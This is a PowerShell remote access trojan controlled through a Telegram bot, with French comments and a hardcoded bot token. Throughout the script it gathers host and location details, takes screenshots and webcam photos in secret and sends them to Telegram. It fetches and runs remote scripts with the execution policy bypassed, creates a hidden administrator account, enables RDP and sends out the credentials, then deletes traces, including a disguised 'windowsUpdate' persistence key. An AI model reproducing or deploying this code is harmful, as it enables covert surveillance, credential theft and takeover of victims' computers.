# Gestion Bot 
$BotToken = "6233862997:AAFxv4SBakCHVM3zqBqkqUcjAJYHjhdNyZw"
$ChatID = '429367185'
# Liens Script BackDoor
$githubScript = "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1"
# Gestion Creation Admin
$ScriptAdmin = "https://raw.githubusercontent.com/Machiavel-QuadCore/BadUsb/main/test.ps1"
$Username = "Bot_Machia"
$Password = "QuadCore"
$lastProcessedUpdateID = 0

$whoami = whoami
$ipV4 = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
$hostname = $env:COMPUTERNAME
$pwd = Get-Location

function Send-Message {
    param (
        [string]$Message,
        [string]$ReplyMarkup
    )
    $curl = Install-Curl
    $body = @{
        "chat_id" = $ChatID
        "text" = $Message
        "reply_markup" = $ReplyMarkup
    }
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" -Method POST -Body $body | Out-Null
}

function Information {
    $InformationsMessage = "ℹ️ Informations générales`n`n" +
    "🌐 Tu es connecté : $ipV4`n" +
    "🖥️ Nom du PC : $hostname`n" +
    "🙎 Utilisateur : $whoami`n" +
    "📂 Chemin du Script : $pwd"

    Send-Message -Message $InformationsMessage

    # Réafficher le menu
    Send-Message -Message $messageRetour -ReplyMarkup $menuKeyboard
}
function IpPublic {
    $ipInfo = Invoke-RestMethod "http://ipinfo.io/json"
    $ipPublic = "     🧭 Localisation`n - - - - - - - - - - - - -`n`n🌍 IP: $($ipInfo.ip)`n🏙️ Ville: $($ipInfo.city)`n📮 Code Postal: $($ipInfo.postal)`n🏴‍☠️ Région: $($ipInfo.region)"

    Send-Message -Message $ipPublic

    # Réafficher le menu
    Send-Message -Message $messageRetour -ReplyMarkup $menuKeyboard
}

function Take-Screenshot {
      [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
        function screenshot([Drawing.Rectangle]$bounds, $path) {
           $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
           $graphics = [Drawing.Graphics]::FromImage($bmp)

           $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

           $bmp.Save($path)

           $graphics.Dispose()
           $bmp.Dispose()
        }
        $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080)
        screenshot $bounds "C:\Users\$env:username\Documents\screenshot.jpg"
}

function Send-Take-Screenshot {
    $SendScreen = "📨 Envoie du Screenshot..."
    Send-Message -Message $SendScreen
    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
    $photo = "C:\Users\$env:username\Documents\screenshot.jpg"
    $curl = Install-Curl
    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
    Wait-Process -Name "powershell" -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 5
    
    $SuppScreen = "♻️ Suppression du Screenshot..."
    Send-Message -Message $SuppScreen
    Remove-Item $photo
    Wait-Process -Name "powershell" -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 5
    $ScreenSupprimer = "✅ Le screenshot à été supprimé."
    Send-Message -Message $ScreenSupprimer
    #& $curl -s -X POST "https://api.telegram.org/bot"$BotToken"/sendPhoto" -F chat_id=$ChatID -F photo="@$SnapFile"

        # Réafficher le menu
    Send-Message -Message $messageRetour -ReplyMarkup $menuKeyboard
}

function webcam {
    $webcamDownload = "⌛ Téléchargement..."
    Send-Message -Message $webcamDownload
    # https://batchloaf.wordpress.com/commandcam/
    $url = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe"
    $outpath = "C:\Users\$env:username\Documents\CommandCam.exe"
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $url -OutFile $outpath
    Wait-Process -Name "powershell" -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 5
    $webcamDownloadFini = "🆗 Téléchargement terminé."
    Send-Message -Message $webcamDownloadFini

    $webcamPrise = "📷 Prendre une photo..."
    Send-Message -Message $webcamPrise
    $args = "/filename C:\Users\$env:username\Documents\image.jpg"
    Start-Process $outpath -ArgumentList $args -WindowStyle Hidden
    Wait-Process -Name "powershell" -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 5

    $webcamEnvoie = "📨 Envoi de la photo..."
    Send-Message -Message $webcamEnvoie
    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
    $photo = "C:\Users\$env:username\Documents\image.jpg"
    $curl = Install-Curl
    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
    Wait-Process -Name "powershell" -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 5

    $webcamSupp = "♻️ Suppression de la photo..."
    Send-Message -Message $webcamSupp
    Remove-Item $photo
    Remove-Item $outpath
    Wait-Process -Name "powershell" -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 5
    $webcamSupprimer = "✅ L'image à été supprimé."
    Send-Message -Message $webcamSupprimer

            # Réafficher le menu
    Send-Message -Message $messageRetour -ReplyMarkup $menuKeyboard
}

function CreeAdmin {
	# Télécharger un script depuis une URL spécifiée et l'enregistrer sur le disque local
	$scriptPath = "C:\Users\$env:username\Documents\NewUser.ps1"
	Invoke-WebRequest -Uri $ScriptAdmin -OutFile $scriptPath

	Send-Message -Message "✅ Téléchargement Terminé..."

	Start-Sleep -Seconds 5

	# Exécuter le script téléchargé en mode silencieux et invisible
	powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath

	Send-Message -Message "✅ Script exécuté."

	# Créer le compte utilisateur
	$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
	New-LocalUser -Name $Username -Password $SecurePassword -FullName "Administrateur" -Description "Compte administrateur créé par script" -PasswordNeverExpires
	Send-Message -Message "✅ Compte utilisateur créé."

	# Ajouter l'utilisateur au groupe Administrateurs
	Add-LocalGroupMember -Group "Administrateurs" -Member $Username
	Send-Message -Message "✅ Utilisateur ajouté au groupe Administrateurs."

	# Activer l'accès RDP
	Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
	Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
	Send-Message -Message "✅ Accès RDP activé."

	# Récupérer l'adresse IP
	$IpAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.AddressFamily -eq "IPv4" }).IPAddress
	Send-Message -Message "✅ Adresse IP récupérée."

	# Envoyer les informations d'accès RDP au bot Telegram
	$RdpAccessMessage = "Accès RDP :`nAdresse IP : $IpAddress`nNom d'utilisateur : $Username`nMot de passe : $Password"
	Send-Message -Message $RdpAccessMessage
	
	            # Réafficher le menu
    Send-Message -Message $messageRetour -ReplyMarkup $menuKeyboard
}

function Invoke-BackDoor {
    # Code pour exécuter la fonctionnalité de la backdoor
}

function Download-File($FileToDownload) {
    # Code pour télécharger un fichier
}

function Main-Browser {
    # Code pour lancer le navigateur
}

function Start-Ncat {
    param (
        [string]$ip
    )
    # Code pour démarrer Ncat avec l'adresse IP spécifiée
}

function Stop-Ncat {
    # Code pour arrêter Ncat
}

function Start-Keylogger {
    param (
        [string]$time
    )
    # Code pour démarrer le keylogger avec la durée spécifiée
}

function Clean-All {
    $checkEmoji = "✅"
    $crossEmoji = "❌"
    $VideEmoji = "♻️"
    # Suppression des captures d'écran
    $screenshotPath = "C:\Users\$env:username\Documents\screenshot.jpg"
    if (Test-Path $screenshotPath) {
        Send-Message -Message "$VideEmoji Suppression des captures d'écran..."
        Remove-Item $screenshotPath -ErrorAction SilentlyContinue
        Wait-Process -Name "powershell" -ErrorAction SilentlyContinue
        Send-Message -Message "$checkEmoji Les captures d'écran ont été supprimées."
        Start-Sleep -Seconds 5
    } else {
        Send-Message -Message "$crossEmoji Aucune capture d'écran trouvée."
    }

    # Suppression cURL
    $curlPath = "C:\Users\$env:username\AppData\Local\Temp\1"
    if (Test-Path $curlPath) {
        Send-Message -Message "$VideEmoji Suppression de cURL..."
        Remove-Item -Path $curlPath -Recurse -Force -ErrorAction SilentlyContinue
        Send-Message -Message "$checkEmoji cURL a été supprimé."
        Start-Sleep -Seconds 5
    } else {
        Send-Message -Message "$crossEmoji cURL non trouvé."
    }

    # Suppression de la Backdoor
    $backdoorPath = "C:\Users\$env:username\Documents\windowsUpdate.ps1"
    $regKey = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
    $backdoorExists = $false
    if (Test-Path $backdoorPath) {
        $backdoorExists = $true
        Remove-Item $backdoorPath -ErrorAction SilentlyContinue
    }
    if ((Get-ItemProperty -Path $regKey -Name "windowsUpdate" -ErrorAction SilentlyContinue) -ne $null) {
        $backdoorExists = $true
        reg delete $regKey /v windowsUpdate /f
    }
    if ($backdoorExists) {
        Send-Message -Message "$VideEmoji Suppression de la Backdoor..."
        Start-Sleep -Seconds 5
        Send-Message -Message "$checkEmoji La Backdoor a été supprimée."
        Start-Sleep -Seconds 5
    } else {
        Send-Message -Message "$crossEmoji La Backdoor n'a pas été trouvée."
    }

    # Suppression de la webcam
    $webcamPath = "C:\Users\$env:username\Documents\CommandCam.exe"
    if (Test-Path $webcamPath) {
        Send-Message -Message "$VideEmoji Suppression de la webcam..."
        Remove-Item $webcamPath -ErrorAction SilentlyContinue
        Wait-Process -Name "powershell" -ErrorAction SilentlyContinue
        Send-Message -Message "$checkEmoji L'accès à la webcam a été supprimé."
        Start-Sleep -Seconds 5
    } else {
        Send-Message -Message "$crossEmoji Aucune webcam trouvée."
    }

    # Suppression du Ncat
    $ncatPath = "C:\Users\$env:username\Documents\nc"
    $ncatZipPath = "C:\Users\$env:username\Documents\nc.zip"
    $ncatExists = $false
    if (Test-Path $ncatPath) {
        $ncatExists = $true
        Remove-Item -Path $ncatPath -Recurse -ErrorAction SilentlyContinue
    }
    if (Test-Path $ncatZipPath) {
        $ncatExists = $true
        Remove-Item $ncatZipPath -ErrorAction SilentlyContinue
    }
    if ($ncatExists) {
        Send-Message -Message "$VideEmoji Suppression de Ncat..."
        Start-Sleep -Seconds 5
        Send-Message -Message "$checkEmoji Ncat a été supprimé."
        Start-Sleep -Seconds 5
    } else {
        Send-Message -Message "$crossEmoji Ncat non trouvé."
    }

    # Réafficher le menu
    Send-Message -Message $messageRetour -ReplyMarkup $menuKeyboard
}

function Install-Curl {
    $curl = "C:\Users\" + $env:username + "\appdata\local\temp\1\curl.exe"
    if(![System.IO.File]::Exists($curl)){
        # file with path $path doesn't exist
        $ruta = "C:\Users\" + $env:username + "\appdata\local\temp\1"
        $curl_zip = $ruta + "\curl.zip"
        $curl = $ruta + "\" + "curl.exe"
        $curl_mod = $ruta + "\" + "curl_mod.exe"
        if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
        if ( (Test-Path $curl_mod) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("https://raw.githubusercontent.com/cybervaca/psbotelegram/master/Funciones/curl.zip","$curl_zip")
        [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null
        [System.IO.Compression.ZipFile]::ExtractToDirectory("$curl_zip","$ruta") | Out-Null
        }
        return $curl
    }
    # else curl exist
    return $curl
}

function Show-Help {
    $helpMessage = "📚 Voici les options disponibles :

- *⁉️ Informations* : Affiche des informations générales sur le système.
- *🌍 Connexion* : Permet d'accéder aux fonctionnalités de connexion.
- *⛓️ Photo* : Donne accès aux fonctionnalités de capture d'écran et de webcam.
- *📷 Autre* : Propose d'autres fonctionnalités telles que le keylogger et la backdoor.
- *🗑️ Tous Supprimer* : Supprime toutes les données et réinitialise le bot.

❓ Que souhaitez-vous faire ? 👇"

     Send-Message -Message $helpMessage -ReplyMarkup $menuKeyboard

}

$messageRetour = "❓ Que souhaitez-vous faire 👇🏻"

$menuMessage = "👋 Hey Salut $($env:USERNAME),`n`n" +
    "❓ Que souhaitez-vous faire ? 👇"

$menuKeyboard = '{
    "keyboard": [
        [
            {"text": "🔎 InfoBot"}
        ],
        [
            {"text": "⁉️ Informations"}
        ],
        [
            {"text": "🌍 Connexion"}
        ],
        [
            {"text": "⛓️ Photo"}
        ],
        [
            {"text": "📷 Autre"}
        ],
        [
            {"text": "🗑️ Tous Supprimer"}
        ]
    ],
    "resize_keyboard": true,
    "one_time_keyboard": true
}'

$subMenuKeyboardInfo = '{
    "keyboard": [
        [
            {"text": "⌚️ Information Général"}
        ],
        [
            {"text": "⚠️ Ip Publique"}
        ],
        [
            {"text": "🔙 Retour au Menu"}
        ]
    ],
    "resize_keyboard": true,
    "one_time_keyboard": true
}'

$subMenuKeyboardConnexion = '{
    "keyboard": [
        [
            {"text": "⌚️ Ncat"}
        ],
        [
            {"text": "🔙 Retour au Menu"}
        ]
    ],
    "resize_keyboard": true,
    "one_time_keyboard": true
}'

$subMenuKeyboardPhoto = '{
    "keyboard": [
        [
            {"text": "🖥️ Capture Scrennshot"}
        ],
        [
            {"text": "📷 Webcam"}
        ],
        [
            {"text": "🔙 Retour au Menu"}
        ]
    ],
    "resize_keyboard": true,
    "one_time_keyboard": true
}'

$subMenuKeyboardAutre = '{
    "keyboard": [
        [
            {"text": "🔑 Keylogger"}
        ],
        [
            {"text": "🚪 Backdoor"}
        ],
        [
            {"text": "🔙 Retour au Menu"}
        ]
    ],
    "resize_keyboard": true,
    "one_time_keyboard": true
}'

while ($true) {
    $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/getUpdates?offset=$($lastProcessedUpdateID + 1)" -Method GET
    foreach ($update in $updates.result) {
        $lastProcessedUpdateID = $update.update_id
        $messageText = $update.message.text

        # Ajoutez cette ligne pour éviter de traiter les anciens messages et les commandes déjà exécutées
        if ($update.message.date -le [DateTimeOffset]::Now.ToUnixTimeSeconds() - 10) { continue }

        switch ($messageText) {
            "🔎 InfoBot" { Show-Help -ReplyMarkup $menuKeyboard; break }
            "⁉️ Informations" { Send-Message -Message $messageRetour -ReplyMarkup $subMenuKeyboardInfo; break }
            "🌍 Connexion" { Send-Message -Message $messageRetour -ReplyMarkup $subMenuKeyboardConnexion; break }
            "⛓️ Photo" { Send-Message -Message $messageRetour -ReplyMarkup $subMenuKeyboardPhoto; break }
            "📷 Autre" { Send-Message -Message $messageRetour -ReplyMarkup $subMenuKeyboardAutre; break }
            "🔙 Retour au Menu" { Send-Message -Message $menuMessage -ReplyMarkup $menuKeyboard; break }
            "🗑️ Tous Supprimer" { Clean-All; break }
            "⌚️ Information Général" { Information; break }
            "⚠️ Ip Publique" { IpPublic; break }
            "🖥️ Capture Scrennshot" { Take-Screenshot; Send-Take-Screenshot; break }
            "📷 Webcam" { webcam; break }
            "🔑 Keylogger" { Start-Keylogger -time 15; break }
            "🚪 Backdoor" { CreeAdmin; break }
            "⌚️ Ncat" { Start-Ncat -ip "example.com"; break }
            default {
                # Afficher le menu principal
                Send-Message -Message $menuMessage -ReplyMarkup $menuKeyboard

                # Si l'entrée de l'utilisateur est un nombre entier, démarrez le keylogger avec le nombre de secondes spécifié
                if ($messageText -match "^\d+$") {
                    $time = [int]$messageText
                    Start-Keylogger -Seconds $time
                }
                # Si l'entrée de l'utilisateur est une adresse IP valide, démarrez Ncat avec l'adresse IP spécifiée
                elseif ($messageText -match "^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$") {
                    $ipAddress = $messageText
                    Start-Ncat -ip $ipAddress
                }
                # Si aucune des conditions précédentes n'est remplie, envoyer un message d'erreur
                #else {
                #    Send-Message -Message "Commande non reconnue. Veuillez sélectionner une option valide."
                #}
            }
        }
    }
    Start-Sleep -Seconds 1
}
